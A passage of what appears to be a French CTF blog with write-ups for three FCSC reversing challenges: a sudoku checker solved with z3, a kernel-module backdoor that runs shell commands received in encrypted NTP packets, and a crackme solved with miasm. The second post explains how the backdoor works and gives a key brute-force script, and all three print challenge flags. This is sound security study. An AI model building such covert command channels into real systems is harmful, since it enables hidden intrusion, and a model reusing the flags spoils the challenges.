prendre le premier élément en user_input[0][0] et vérifier que celui-ci se trouve entre 1 et 9 et que la valeur n\u0026rsquo;apparaît pas deux fois sur la ligne.\nVoici un pseudo code de ce que fais cette fonction :\nfunction inattendu(line) { val = 0 is_ok = true for (i in range 9) { x = user_input[line][i] if (x \u0026lt; 1 or x \u0026gt; 9) { is_ok = false } shifted = 1 \u0026lt;\u0026lt; x if (shifted \u0026amp; val) { is_ok = false } val = val | shifted } return is_ok } Cette fonction est appelé 9 fois donc très probablement pour chaque ligne de notre input.\nEnsuite une autre fonction très similaire est appelée 9 fois, celle-ci effectue les mêmes opérations mais cette fois sur chaque colonne.\nA partir de là, on peut se douter que le programme implémenté est un sudoku. Je n\u0026rsquo;ai pas reverse la fonction discutable mais celle-ci effectuant des multiplications par 3 et étant donné le contexte du challenge on peut très facilement deviner qu\u0026rsquo;elle va vérifier que chaque région du sudoku est valide.\nÀ la suite de cela, le programme va itérer sur un tableau 9x9 qu\u0026rsquo;il possède en mémoire.\non le comprend grâce aux extraits suivants de notre trace d\u0026rsquo;exécution :\nget array[0] get array[0] 0 != 0 [...] get array[0] get array[1] 0 != 0 [...] get array[0] get array[2] 0 != 0 [...] get array[0] get array[7] 1 != 0 [...] get array[0] get array[8] 8 != 0 [...] Lorsque la valeur extraite de ce tableau est différente de 0, le programme appelle la fonction gerber. On peut ainsi reconstruire le contenu du tableau, qui ressemble à ceci :\n0 0 0 0 0 0 0 1 8 0 0 5 6 1 0 0 2 0 3 0 0 0 0 0 5 1 0 0 0 0 0 0 0 0 0 2 1 0 0 0 3 0 0 4 4 0 0 0 0 2 1 0 0 5 0 0 0 0 4 3 0 6 1 3 1 0 1 0 6 0 0 0 0 0 4 7 0 0 0 6 7 La fonction gerber, à partir de la position et de la valeur non nulle, appelle ensuite la fonction central. Celle-ci génère quatre nouvelles positions autour de la position d\u0026rsquo;origine, dans un rayon (horizontal et vertical, pas en diagonale) de N cases, où N correspond à la valeur lue dans notre grille à la position de départ.\nLe programme va ensuite vérifier si au moins une de ces 4 nouvelles positions contient la valeur N.\nVoici un exemple avec les valeurs 3 et 1 afin que ce soit plus parlant.\nRésolution Nous avons donc maintenant toutes les conditions en mains pour pouvoir écrire notre script de solve.\nPour cela, j\u0026rsquo;ai utilisé un script z3 permettant de résoudre un sudoku auquel j\u0026rsquo;ai ajouté nos conditions.\nfrom z3 import * grid = [[Int(f\u0026#34;cell_{i}_{j}\u0026#34;) for j in range(9)] for i in range(9)] s = Solver() for i in range(9): for j in range(9): s.add(And(grid[i][j] \u0026gt;= 1, grid[i][j] \u0026lt;= 9)) for i in range(9): s.add(Distinct(*grid[i])) for j in range(9): col = [grid[i][j] for i in range(9)] s.add(Distinct(*col)) for bi in range(3): for bj in range(3): block = [grid[3*bi + di][3*bj + dj] for di in range(3) for dj in range(3)] s.add(Distinct(*block)) condition_grid = [ [0, 0, 0, 0, 0, 0, 0, 1, 8], [0, 0, 5, 6, 1, 0, 0, 2, 0], [3, 0, 0, 0, 0, 0, 5, 1, 0], [0, 0, 0, 0, 0, 0, 0, 0, 2], [1, 0, 0, 0, 3, 0, 0, 4, 4], [0, 0, 0, 0, 2, 1, 0, 0, 5], [0, 0, 0, 0, 4, 3, 0, 6, 1], [3, 1, 0, 1, 0, 6, 0, 0, 0], [0, 0, 4, 7, 0, 0, 0, 6, 7], ] def get_positions(i,j,k): return [(a, b) for a,b in [ (i + k, j), (i, j + k), (i, j - k), (i - k, j), ] if a \u0026lt; 9 and b \u0026lt; 9 and a \u0026gt;= 0 and b \u0026gt;= 0] # on ajoute nos conditions spécifiques à partir de notre grille de condition for i in range(9): for j in range(9): k = condition_grid[i][j] if k: pos = get_positions(i,j, k) s.add(Or(*[ grid[x][y] == k for x,y in pos ])) if s.check() == sat: m = s.model() solution = [[m.evaluate(grid[i][j]).as_long() for j in range(9)] for i in range(9)] for ligne in solution: print(ligne) else: print(\u0026#34;Pas de solution trouvée.\u0026#34;) On lance notre script z3 et on obtiens notre grille de solution.\n8 3 6 2 1 9 7 5 4 5 4 9 7 8 6 3 1 2 1 2 7 3 4 5 9 6 8 6 5 8 1 9 3 4 2 7 3 1 4 8 2 7 6 9 5 7 9 2 5 6 4 8 3 1 9 6 5 4 7 1 2 8 3 4 8 1 6 3 2 5 7 9 2 7 3 9 5 8 1 4 6 On peut maintenant l\u0026rsquo;envoyer à notre programme et celui-ci nous renvoie le flag !\nFCSC{836219754549786312127345968658193427314827695792564831965471283481632579273958146} ","permalink":"https://trikkss.github.io/posts/fcsc2025_fcsclang/","summary":"Write up du challenge fcsclang","title":"FCSC 2025 - fcsclang"},{"content":"Contexte Le SOC de la chaîne de télévision TV Hacks a remarqué des paquets NTP étranges passant leur pare-feu dans le sillage de paquets légitimes. Ces messages sont à destination de l\u0026rsquo;équipement responsable de la génération des flux télévisuels pour la TNT.\nUne analyse de la machine n\u0026rsquo;a pas permis de trouver quoi que ce soit de suspect à part un module noyau Linux qui semble servir à l\u0026rsquo;optimisation des flux IP à destination de notre diffuseur.\nCe module et un extrait de capture réseau vous sont fournis pour une première analyse.\nL\u0026rsquo;équipement ne peut être arrêté sous aucun prétexte : cela signifierait un écran noir pour tous les téléspectateurs ! Si vous pouviez comprendre ce que fait l\u0026rsquo;attaquant, nous pourrons peut-être éviter un drame national.\nNous avons donc un module kernel ainsi qu\u0026rsquo;une capture réseau contenant 6 trames NTP.\nvous pouvez retrouver les deux fichiers ici.\nDécouverte du module kernel après avoir récupéré le module kernel, nous pouvons utiliser la commande modinfoafin de lister les informations le concernant.\n╭─user@arch-vmware ~/shared/FCSC_2024/TV-HACKS-1 ╰─➤ modinfo ipopt.ko 127 ↵ filename: /home/user/shared/FCSC_2024/TV-HACKS-1/ipopt.ko description: IP optimizer author: Shenzhen NetSoft Technology Co., Ltd. license: GPL alias: acpi*:PNP0700:* alias: pnp:dPNP0700* depends: vermagic: 3.2.0-4-amd64 SMP mod_unload modversions le vermagic nous indique que ce module a été compilé pour un kernel 2.2.0-4-amd64.\nIl est donc nécessaire d\u0026rsquo;avoir la bonne version de notre kernel afin de pouvoir le lancer.\nJ\u0026rsquo;ai pour ma part d\u0026rsquo;abord commencé par lire le code statique, mais ma solution ne fonctionnait pas. N\u0026rsquo;ayant pas confiance en mes capacitées de compréhension de code j\u0026rsquo;ai donc décidé d\u0026rsquo;émuler le binaire afin de vérifier mes incertitudes. J\u0026rsquo;ai néanmoins appris énormément de choses grâce à ça.\nEmulation du binaire Afin de pouvoir débugger le kernel de notre debian nous allons émuler notre VM à l\u0026rsquo;aide de qemu. Pour ça nous récupèrons un ISO de debian possèdant le kernel 2.2.0-4-amd64 et nous procédons à l\u0026rsquo;installation.\nqemu-img create debian.img 20G qemu-system-x86_64 -hda debian.img -cdrom debian-7.11.0-amd64-kde-CD-1.iso -boot d -m 512 nous faisons ensuite une installation classique de Debian et enfin nous pouvons lancer notre vm.\nqemu-system-x86_64 -hda debian.img -m 512 j\u0026rsquo;ai également mis en place en network bridge afin de pouvoir envoyer des paquets NTP à ma VM (les paquets envoyés depuis la VM vers elle même à l\u0026rsquo;aide de scapy ne semblaient pas être intercepté par le module kernel.) Pour ça j\u0026rsquo;ai suivi ligne pour ligne cet article : https://www.spad.uk/posts/really-simple-network-bridging-with-qemu/\nvoici ma commande finale permettant de lancer ma VM\nqemu-system-x86_64 -hda debian.img -m 1024 -s -net nic,model=virtio,macaddr=52:54:00:00:00:01 -net bridge,br=virbr0 j\u0026rsquo;utilise l\u0026rsquo;option -s afin de pouvoir debugger le kernel en remote.\nDebuggage on charge le module kernel\ninsmod ipopt.ko on récupère son addresse en mémoire\ncat /proc/modules | grep ipopt puis dans gdb\ntarget remote :1234 # placer un breakpoint dans le module kernel b*module_base_addr + offset_from_disassembler afin de pouvoir effectuer mes tests sur le module kernel j\u0026rsquo;ai également utilisé scapy de la manière suivante :\ndata = \u0026#34;donnees que je souhaite envoyer\u0026#34; a = IP(dst=\u0026#34;remote ip\u0026#34;)/UDP(dport=123, sport=1337)/Raw(load=data) send(a) Fonctionnement du binaire Analysons maintenant le code du module.\nLa fonction que j\u0026rsquo;ai renommer do_hmac_512() va effectuer un hmac_512 avec comme message la variable globale que j\u0026rsquo;ai renommée user_key et comme clé 32 octets contenus dans la variable globale unk_3310.\nuser_key contient 16 octets nul au début du programme.\nLe résultat de celle ci est stocké dans une variable globale hmac_output que nous utiliserons plus tard.\nEnsuite la fonction que j\u0026rsquo;ai appeler deobfuscate_function() va déobfusquer les éléments nécessaires à l\u0026rsquo;execution de commande bash. Nous ne nous y intéresseront pas.\nLe binaire va ensuite mettre un place des hook netfilter. Ces hooks vont permettre d\u0026rsquo;intercepter les trames entrantes et sortantes sur la machine afin de pouvoir les examiner, les modifiers, etc.\nla définition de cette fonction est la suivante :\nint nf_register_hooks(struct nf_hook_ops *reg, unsigned int n); Cette fonction prend en paramètre une liste de structure nf_hooks_op ainsi que le nombre d\u0026rsquo;éléments présents cette liste.\nstruct nf_hook_ops { struct list_head list; /* User fills in from here down. */ nf_hookfn\t*hook; struct module\t*owner; void\t*priv; u_int8_t\tpf; unsigned int\thooknum; /* Hooks are ordered in ascending priority. */ int\tpriority; }; Nous allons nous intéresser au premier élément dde notre strutcure hookqui est en réalité un pointeur vers la une fonction à executer.\nOn récupère donc 4 hooks netfilter que nous allons renommer tout simple hook1, hook2, hook3, hook4.\nLes deux premiers servent à filtrer le trafic entrant, les deux derniers servent à filtrer le trafic sortant sur la machine.\nAnalyse des paquets entrant Les deux premiers hooks semblent faire la même chose pour des types de paquets différents, ils vont d\u0026rsquo;abord parser notre paquet, vérifier que celui ci est un paquet NTP (verifie que le protocole soit UDP ainsi que le port source soit 123), vérifier que le début des données NTP commencent par fCsC avant d\u0026rsquo;envoyer ces données à une autre fonction.\nvoici le code décompilé et pas très propre car je n\u0026rsquo;avais pas la force de recréer les structures dans IDA. Néanmoins j\u0026rsquo;ai laissé des commentaires sur les parties importantes de celui ci.\nNous arrivons maintenant sur la partie intéressante.\nSi le paquet est de la forme souhaitée, le code va appeler deux fonctions et vérifier si celle-ci retournent 0.\nLa première fonction prend en paramètre :\nun pointeur vers les données NTP du paquet la taille de ces données - 16 une liste de 8 bytes la taille de celle ci un pointeur vers les 16 derniers bytes de nos données NTP la taille de ces 16 derniers bytes la seconde fonction va prendre en paramètre:\nun pointeur vers nos données NTP à l\u0026rsquo;offset 20 la taille de notre paquet - 36 un pointeur vers une variable que nous verrons plus tard un pointeur vers une liste de 8 bytes la taille de celle ci un pointeur vers les données contenu dans notre paquet NTP juste après le fCsC la taille des données. à partir de ces infos nous pouvons avoir une idée de la structure des paquets NTP envoyés.\nmagic number : 4 bytes (fCsC) data1 : 16 bytes data2 : n bytes data3 : 16 bytes Nous pouvons maintenant nous aventurer dans notre première fonction.\nJ\u0026rsquo;ai détaillé celle-ci en 5 points principaux :\nLe binaire va déobfusquer une chaine de caractère en mémoire correspondant à hmac(256) puis il va faire appel à la fonction crypto_alloc_shashavec comme argument notre chaine de caractère déchiffrée. Il va donc créer un \u0026ldquo;crypto handler\u0026rdquo; nous permettant par la suite d\u0026rsquo;hasher nos données. Le binaire utilise une obfuscation très simple sur les chaines de caractère, celle ci consiste à prendre la liste d\u0026rsquo;octets obfusqué 2 par 2 et appliquer un xor entre ces deux octets. Cette opération est réalisée par la fonction sub_23C0.\nv1 = [ 0xc1, 0xa9, 0xa6, 0xcb, 0xd5, 0xb4, 0x97, 0xf4, 0x6f, 0x47, 0xb8, 0xcb, 0x10, 0x78, 0xfd, 0x9c, 0x58, 0x6a, 0x98, 0xad, 0x13, 0x25, 0xe1, 0xc8, 0x77, 0x77 ] for i in range(0,len(v1),2): print(chr(v1[i] ^ v1[i+1]), end=\u0026#34;\u0026#34;) print() # output : hmac(sha256) Il va ensuite faire appel à la fonction __________10() avec comme arguments les 8 bytes passé en paramètres, ainsi qu\u0026rsquo;un pointeur vers un buffer de 32 bytes. Nous reviendrons sur cette fonction (que j\u0026rsquo;aurai du renommer plus proprement) juste après. Garder en tête qu\u0026rsquo;elle génère la clé pour notre hmac 256.\nNous spécifions la clé à utiliser à notre crypto handler.\nNous effectuons un hmac256 de nos données NTP sans les 16 derniers bytes.\nEt enfin nous comparons le hash obtenu avec les 16 derniers bytes de nos données NTP.\nCette fonction fais donc une vérification d\u0026rsquo;intégritée sur les paquets NTP que le serveur reçoit.\nNous allons maintenant rapidemment détailler la fonction __________10()\nCelle-ci effectue \u0026hellip; roulement de tambours \u0026hellip; un hmac 256 !\nElle prend comme clé notre variable globale hmac_output que nous avons définie au début de notre analyse et en message la valeur passé en paramètre de la fonction + 1 byte à 1. (j\u0026rsquo;ai simplifié le fonctionnement de la fonction car le reste n\u0026rsquo;est pas utilisé dans notre cas, néanmoins le fonctionnement de celle ci est légérement différent si l\u0026rsquo;output demandé en paramètre est différent supérieur à 32.)\nce qui nous donne en python\nout = hmac.new( hmac_output, msg=p1 + (1).to_bytes(1, \u0026#34;little\u0026#34;), digestmod=hashlib.sha256 ).digest() Nous en avons maintenant fini avec cette première fonction. Nous pouvons maintenant nous attaquer à la deuxième fonction.\nPour rappel, les valeurs passées en paramètre à cette fonction sont nos données NTP à l\u0026rsquo;offset 20 (sans le magic byte et sans les 16 premiers bytes), la taille de ces données, un pointeur vers une chaine de 8 bytes, la taille de celle-ci, ainsi qu\u0026rsquo;un pointeur vers les 16 premiers octets de nos données et encore une fois leur taille.\nJ\u0026rsquo;ai encore une fois simplifié la fonction en 6 points principaux.\nIl vérifie que la taille des données est un multiple de 16.\nil va déobfusquer la chaine de caractère cbc(aes) et créer un crypto handler pour pouvoir déchiffrer de l\u0026rsquo;aes.\nil fait à nouveau appel à la fonction __________10() afin de lui générer une clé de 16 bytes avec les 8 bytes passé en argument.\nIl spécifie ensuite la clé à notre crypto handler.\nIl déchiffre enfin nos données passé en paramètre avec comme IV les 16 premiers octets de notre paquet NTP\nIl vérifie que le padding des données déchifrée est correct (il utilise le padding PKCS7)\nAfin d\u0026rsquo;identifier les fonctions permettant de spécifier la clé AES et chiffrer les données j\u0026rsquo;ai rechercher sur internet comment était effectué les chiffrements AES cbc dans le kernel. Les paramètres passé en paramètres de mes fonctions concordaient à celles présentes sur internet et grâce au débugger que j\u0026rsquo;ai mis en place j\u0026rsquo;ai pu confirmer ma théorie en verifiant les valeurs en sortie de fonction.\nSi nous récapitulons, nous avons des paquets de la forme suivante.\nA ce moment là je pensais que le challenge etait terminé, plus qu\u0026rsquo;a déchiffrer les données présentes dans le pcap \u0026hellip; que nenni ! C\u0026rsquo;est que le début !\nInterprétation des données déchiffrée Une fois nos données déchiffrées, l\u0026rsquo;algorithme va vérifier si le premier byte de celui est à 0.\ns\u0026rsquo;il n\u0026rsquo;est pas nul, alors on va executer le code présent dans les données déchiffrée \u0026hellip; seulement si la user_key n\u0026rsquo;est pas nul ! je n\u0026rsquo;avais pas fait gaffe à cette condition au début, c\u0026rsquo;était donc logique que je ne puisse pas déchiffrer les données.\nsi le premier byte est nul, alors les 16 prochains octets vont servir à définir une nouvelle clé stockée dans la variable user_key.\nL\u0026rsquo;utilisateur a donc forcément défini une clé avant de pouvoir envoyer ses payloads.\nGénération d\u0026rsquo;une nouvelle clé la génération de la clé est très simple, il va d\u0026rsquo;abord appliquer 3 opérations ET binaire sur chaque octet de la clé envoyé dans la trame NTP avant d\u0026rsquo;utiliser celle-ci dans la fonction do_hmac_sha512() que nous avons déjà vu au début. Pour rappel, cette fonction stocke le hash créé dans la variable globale hmac_output.\nVoici donc un schéma simplifié de notre chiffrement\nNotre clé est utilisée deux fois, pour chiffrer mais également pour générer le checksum.\nCasser le chiffrement La vulnérabilité de ce chiffrement réside dans les 3 ET binaire appliqué sur la clé donnée par l\u0026rsquo;utilisateur.\nEn effet, l\u0026rsquo;opération \u0026amp; fonctionne de la manière suivante :\n1 \u0026amp; 1 = 1 0 \u0026amp; 1 = 0 1 \u0026amp; 0 = 0 0 \u0026amp; 0 = 0 prenons un example :\nImaginons nous avons une clé sur 1 octet : 'A' -\u0026gt; 01000001\nNous avons donc 8 bits à bruteforce pour trouver la bonne clé.\nMais si l\u0026rsquo;on applique un \u0026amp; avec la valeur 'F' -\u0026gt; 01000110\nAlors les octets 1, 4, 5, 6 et 8 seront forcément à 0 et nous aurons seulement les valeurs 2, 3 et 7 à bruteforce.\nsi l\u0026rsquo;on applique un \u0026amp; une fois notre clé est affaiblie, alors imaginez 3 fois !\nNous allons donc bruteforce notre clé de 16 octets, pour chaque clé nous allons calculer la valeur du checksum avec celle-ci et comparer avec le checksum présent dans la trame NTP. Si le checksum calculé avec notre clé est égal à celui présent dans la trame alors nous aurons trouvé la bonne clé de chiffrement.\nVoici le script qui va nous permettre de casser la clé de chiffrement.\nimport binascii import hmac import hashlib from Crypto.Cipher import AES and_values = [0x2F, 0x4E, 0x2F, 0x66, 0xE4, 0x7F, 0x7A, 0x5E, 0xEB, 0xE5, 0xE7, 0x8C, 0xB2, 0x19, 0x1C, 0x36, 0xB7, 0xFB, 0x76, 0x0E, 0xAC, 0x28, 0x0C, 0xDE, 0xB7, 0xBF, 0x98, 0x69, 0x39, 0x7B, 0xFB, 0xFD, 0xE2, 0x76, 0xCB, 0xFE, 0x5D, 0xDF, 0x70, 0xC9, 0x8F, 0x54, 0x16, 0xAD, 0xFF, 0xF6, 0xB7, 0xCE] hmac_key = [0x15, 0xba, 0x94, 0x08, 0x48, 0x6e, 0x0d, 0xa2, 0x6d, 0x67, 0xe9, 0x7b, 0xc5, 0x56, 0x2c, 0xd2, 0x2e, 0x58, 0xa7, 0x4d, 0x05, 0x32, 0xa2, 0x26, 0x21, 0x8a, 0x35, 0xfe, 0x35, 0x59, 0x99, 0x54] # la trame NTP paquet = binascii.unhexlify(\u0026#34;6643734364bda3c196d86f172737afdc409cdb3d675995e6524e17b50f16b0de154404f0df3c0b5f62193b759965e7f6d76cb38ac475d9c91e16217376fd97b33e09228ee738ecdf0b7ee2c1001f42f8700c1125683750d77825417142069c0a849d5c7fd44e54e43b49365cd1569304667a4dc702a6155f84ad155ee5fa21623bce226fa3b3f1e18dbd2da64253d9e0e1054ee8\u0026#34;) # les 8 octets utilisé pour générer la clé du hmac ainsi que la clé AES p1 = binascii.unhexlify(\u0026#34;A612E61640B3218E\u0026#34;) p2 = binascii.unhexlify(\u0026#34;192C98524983EAB4\u0026#34;) IV = paquet[4:4+16] ciphertext = paquet[4+16:-16] checksum = paquet[-16:] partial_key = \u0026#34;\u0026#34; # on récupère les \u0026amp; finaux afin de connaitre les bits qui seront à 0 for i in range(16): x = f\u0026#34;{and_values[i] \u0026amp; and_values[i+16] \u0026amp; and_values[i+32]:08b}\u0026#34; partial_key += x # on compte le nombre de bits à bruteforce n = partial_key.count(\u0026#34;1\u0026#34;) values = [i for i in partial_key] # on bruteforce jusqu\u0026#39;a ce que le checksum soit le même. for i in range(0, 2**n): v = f\u0026#34;{i:021b}\u0026#34; partial_test = values.copy() k = 0 for j in range(len(partial_test)): if partial_test[j] == \u0026#34;1\u0026#34;: partial_test[j] = v[k] k += 1 partial_key_test = int(\u0026#34;\u0026#34;.join(partial_test), 2).to_bytes(16, \u0026#34;big\u0026#34;) key2 = hmac.new( bytes(hmac_key), msg=bytes(partial_key_test), digestmod=hashlib.sha256 ).digest() out = hmac.new( key2, msg=p1 + (1).to_bytes(1, \u0026#34;little\u0026#34;), digestmod=hashlib.sha256 ).digest() final_key = hmac.new( out, msg=paquet[:-16], digestmod=hashlib.sha256 ).digest() if final_key[:16] == checksum: break # on calcule la clé de chiffrement AES out = hmac.new( bytes(key2), msg=p2 + (1).to_bytes(1, \u0026#34;little\u0026#34;), digestmod=hashlib.sha256 ).digest() # on déchiffre les données. decipher = AES.new(out[:16],AES.MODE_CBC, IV) plaintext = decipher.decrypt(ciphertext) print(plaintext) Après quelques minutes on récupère une joli commande bash avec le flag présent à l\u0026rsquo;intérieur :)\n╭─user@arch-vmware ~/shared/FCSC_2024/TV-HACKS-1 ╰─➤ python3 bruteforce_bits.py 1 ↵ b\u0026#39;/bin/sh\\x00-c\\x00echo \u0026#34;FCSC{5d58e776e659866d110ac50dc2bce631e634222953a234893cb4978594ec0ae1}\u0026#34; \u0026gt; /root/flag1\\x00\\x00\\x08\\x08\\x08\\x08\\x08\\x08\\x08\\x08\u0026#39; ","permalink":"https://trikkss.github.io/posts/fcsc2024_tv-hacks1/","summary":"Write up du challenge TV Hacks 1/2","title":"FCSC 2024 - TV Hacks 1/2"},{"content":"vous pouvez retrouver le binaire ici\nCe challenge est une version simplifiée d\u0026rsquo;un challenge nommé \u0026ldquo;chaussette\u0026rdquo;, durant la résolution de sa version compliquée j\u0026rsquo;ai appris à utiliser miasm, un framework de reverse engineering que j\u0026rsquo;ai trouvé très intéressant malgré le peu de documentation. J\u0026rsquo;ai donc décidé de proposer une solution utilisant miasm.\nDécouverte du challenge Pour ce challenge, un binaire nous est donné. La commande file permet d\u0026rsquo;en apprendre un peu plus à son sujet.\n╭─user@arch-vmware ~/shared/fcsc2023/reverse/chaussette-xs\r╰─➤ file chaussette-xs\rchaussette-xs: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=913fe53d14998feda6a550d5a815830cf4ab132f, for GNU/Linux 3.2.0, stripped On apprend donc que l\u0026rsquo;on a un ELF x86-64. On va donc l\u0026rsquo;ouvrir dans ghidra afin d\u0026rsquo;avoir de comprendre ce qu\u0026rsquo;il fait plus précisemment.\nvoid FUN_00102140(undefined8 param_1,undefined8 param_2,undefined8 param_3) { undefined8 unaff_retaddr; undefined auStack_8 [8]; __libc_start_main(FUN_00102000,unaff_retaddr,\u0026amp;stack0x00000008,FUN_00103230,FUN_00103290,param_3, auStack_8); do { /* WARNING: Do nothing block with infinite loop */ } while( true ); } On regard donc le point d\u0026rsquo;entrée du binaire afin de trouver la fonction main de l\u0026rsquo;application.\nIci, l\u0026rsquo;appel à la fonction libc_start_main de la libc nous permet de récuperer notre fonction principale qui sera donc FUN_00102000 .\nOn va de suite la renommer afin d\u0026rsquo;y voir plus clair et de la retrouver plus facilement (clic droit sur la fonction -\u0026gt; Rename function).\nOn arrive donc sur le code principal de notre fonction qui est assez simple à comprendre.\nundefined8 main(void) { int iVar1; long lVar2; undefined8 *puVar3; ulong *puVar4; ulong uVar5; ulong *puVar6; undefined8 *puVar7; byte bVar8; ulong local_18; undefined8 local_10; bVar8 = 0; lVar2 = sysconf(0x1e); if (lVar2 == 0x1000) { puVar3 = (undefined8 *)mmap((void *)0x0,0x100000,7,0x22,-1,0); DAT_001061b0 = puVar3; *puVar3 = 0x1a22d2ea22d1b848; *(undefined8 *)((long)puVar3 + 0xf9) = 0xc3f83148b12e2565; lVar2 = (long)puVar3 - (long)(undefined8 *)((ulong)(puVar3 + 1) \u0026amp; 0xfffffffffffffff8); puVar7 = (undefined8 *)((long)\u0026amp;DAT_001060a0 - lVar2); puVar3 = (undefined8 *)((ulong)(puVar3 + 1) \u0026amp; 0xfffffffffffffff8); for (uVar5 = (ulong)((int)lVar2 + 0x101U \u0026gt;\u0026gt; 3); uVar5 != 0; uVar5 = uVar5 - 1) { *puVar3 = *puVar7; puVar7 = puVar7 + (ulong)bVar8 * -2 + 1; puVar3 = puVar3 + (ulong)bVar8 * -2 + 1; } __isoc99_scanf(\u0026amp;DAT_00104004,\u0026amp;local_18); __isoc99_scanf(\u0026amp;DAT_00104004,\u0026amp;local_10); lVar2 = (*(code *)DAT_001061b0)(local_18,local_10); if (lVar2 == 0) { iVar1 = mprotect(FUN_00103000,0x400,7); if (iVar1 != -1) { puVar4 = (ulong *)FUN_00103000; uVar5 = local_18; do { *puVar4 = *puVar4 ^ uVar5; puVar6 = puVar4 + -0x205ff; uVar5 = uVar5 * 0x5851f42d4c957f2d + 0x14057b7ef767814f; puVar4 = puVar4 + 1; } while (puVar6 \u0026lt; (ulong *)0x1f8); FUN_00103000(DAT_001061b0,local_18,local_10); } } } return 0; } Il va dans un premier temps allouer 0x100000 octets sur le tas avec les droits de lecture, d\u0026rsquo;écriture et d\u0026rsquo;execution grâce à la fonction mmap\nIl va ensuite effectuer certaines opérations afin d\u0026rsquo;écrire des données dans la mémoire allouée, on ne s\u0026rsquo;attardera pas dessus.\nPuis le programme va demander à l\u0026rsquo;utilisateur 2 entrées. Si l\u0026rsquo;on regard à l\u0026rsquo;addresse DAT_00104004 on peut voir qu\u0026rsquo;elle pointe vers la chaine de caractères : \u0026ldquo;%lu\u0026rdquo; ce qui signifie que la fonction scanf va demander à l\u0026rsquo;utilisateur 2 entiers non signés de 64 bytes.\nEnfin, il va appeler le code placé dans la mémoire allouée précedemment avec comme paramètres les 2 valeurs entrées par l\u0026rsquo;utilisateur.\nEn fonction du résultat de cette fonction il va continuer l\u0026rsquo;execution du programme ou non. On comprend donc rapidemment que notre première épreuve va être de trouver les entrées correctes afin que cette fonction retourne 0.\nA la suite de cette fonction, si les valeurs entrées sont correctes le binaire va appeler la fonction mprotect() afin d\u0026rsquo;ajouter les droits d\u0026rsquo;écriture sur la fonction FUN_00103000 et va ensuite modifier son contenu. Un fois le code de la fonction modifié, il va l\u0026rsquo;appeler comme argument l\u0026rsquo;addresse de notre mémoire précedemment allouée ainsi que nos 2 entrées utilisateur.\npremier shellcode La première étape de ce crackme va donc être de trouver les valeurs correcte afin que le code placé en mémoire retourne 0. On va donc utiliser un debugger afin de placer un point d\u0026rsquo;arrêt au moment de l\u0026rsquo;appel à la fonction et de récuperer son code.\nPour ma part j\u0026rsquo;utilise gdb.\nPetite astuce d\u0026rsquo;ailleurs si vous utilisez comme moi ghidra pour décompiler votre code et gdb pour debugger, vous pouvez changer la base address dans ghidra afin que vos addresses soit les mêmes entre ghidra et votre debugger. Il suffit d\u0026rsquo;aller dans Window -\u0026gt; Memory map ensuite vous cliqué sur la petite maison et changer l\u0026rsquo;addresse de la base du binaire.\non lance donc gdb, on place notre point d\u0026rsquo;arret et on lance notre binaire.\n(gdb) b*0x5555555560aa\rBreakpoint 1 at 0x5555555560aa\r(gdb) run\rStarting program: /home/user/shared/fcsc2023/reverse/chaussette-xs/chaussette-xs\r[Thread debugging using libthread_db enabled]\rUsing host libthread_db library \u0026#34;/usr/lib/libthread_db.so.1\u0026#34;.\r123\r123\rBreakpoint 1, 0x00005555555560aa in ?? ()\r(gdb) x/i $rip\r=\u0026gt; 0x5555555560aa: call QWORD PTR [rip+0x4100] # 0x55555555a1b0 On peut voir qu\u0026rsquo;on est bel et bien arrété avant l\u0026rsquo;appel à la fonction.\nLa commande x/i address permet de décoder les opcodes présent à une addresse.\nOn va donc pouvoir afficher notre shellcode grâce à cette commande.\nAttention, ici le code ne se trouve pas à l\u0026rsquo;addresse mais à l\u0026rsquo;addresse pointée par celle ci.\n(gdb) x/gx 0x55555555a1b0\r0x55555555a1b0: 0x00007ffff7cc5000\r(gdb) x/100i 0x00007ffff7cc5000\r0x7ffff7cc5000: movabs rax,0x33a11a22d2ea22d1\r[...]\r0x7ffff7cc50ed: mul rdi\r0x7ffff7cc50f0: mov rdi,rax\r0x7ffff7cc50f3: movabs rax,0xb12e2565d1efe9f8\r0x7ffff7cc50fd: xor rax,rdi\r0x7ffff7cc5100: ret On a donc un joli code assembleur, maintenant il faut le résoudre. On remarque d\u0026rsquo;ailleurs qu\u0026rsquo;il utilise une seule des entrées utilisateur dans cette fonction. Ce sera de même tout le long du programme, la seconde entrée n\u0026rsquo;est pas utilisée.\nmovabs rax,0x33a11a22d2ea22d1 sub rdi,rax dec rdi movabs rax,0x94224bcad3296113 or rax,0x1 mul rdi mov rdi,rax dec rdi movabs rax,0xd3b1bf2d4d1d294a sub rdi,rax movabs rax,0xbe35746c05e956a9 add rdi,rax movabs rax,0x5819ea9fcbc8779 xor rdi,rax dec rdi movabs rax,0x7f7965e1baca6c8f sub rdi,rax neg rdi ror rdi,0xd movabs rax,0x4368955c512ca39b sub rdi,rax inc rdi neg rdi ror rdi,0x32 movabs rax,0x96ccb75bd569807d sub rdi,rax inc rdi movabs rax,0x9f40cb3b786d6842 or rax,0x1 mul rdi mov rdi,rax ror rdi,0x14 neg rdi neg rdi movabs rax,0x1fd3e4098240e723 add rdi,rax movabs rax,0xda3d1c27bae9522c sub rdi,rax rol rdi,0x36 inc rdi inc rdi dec rdi rol rdi,0x21 rol rdi,0x38 dec rdi neg rdi movabs rax,0xc88d84433f7b14e7 or rax,0x1 mul rdi mov rdi,rax movabs rax,0xb12e2565d1efe9f8 xor rax,rdi ret Il n\u0026rsquo;est pas très compliqué et aurait pu facilement être résolu à la main, néanmoins pour cette solution on utilisera miasm.\nOn va dump les octets de ce code dans un fichier, gdb nous permet de le faire grâce à sa commande dump\n(gdb) dump binary memory bytcodes_function 0x7ffff7cc5000 0x7ffff7cc5101 Je vous invite donc maintenant à installer miasm.\nRésolution avec Miasm Pour cette partie nous allons utiliser le framework miasm afin de résoudre ce code.\nVoici mon code permettant de trouver les entrées correctes à notre fonction. J\u0026rsquo;ai commenté le code au maximum, néanmoins je vais quand même vous résumer son fonctionnement afin d\u0026rsquo;être sur que tout le monde comprenne.\nLe programme va dans un premier temps lire les octets que l\u0026rsquo;on a dump précedemmemnt, les interpreter puis lancer une execution symbolique sur notre code. A la suite de cette exécution symbolique il va récuperer l\u0026rsquo;expression symbolique du registre RAX, qui est le registre qui contient notre valeur de retour et la transformer en contrainte compréhensible par z3. A partir de là on va simplifier cette expression et la résoudre.\nfrom miasm.analysis.machine import Machine from miasm.core.locationdb import LocationDB from miasm.analysis.binary import Container from miasm.expression.expression import * from miasm.ir.symbexec import SymbolicExecutionEngine from miasm.ir.translators.z3_ir import 